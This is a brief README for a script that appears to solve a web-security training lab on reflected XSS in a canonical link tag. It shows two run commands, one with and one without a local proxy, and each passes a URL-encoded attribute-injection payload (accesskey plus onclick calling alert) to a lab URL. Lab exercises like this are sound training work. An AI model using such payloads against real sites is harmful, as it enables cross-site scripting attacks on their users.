# How to run script.py

### Reflected XSS in canonical link tag

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%27accesskey=%27x%27onclick=%27alert(1)"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%27accesskey=%27x%27onclick=%27alert(1)" -p 127.0.0.1:8080`
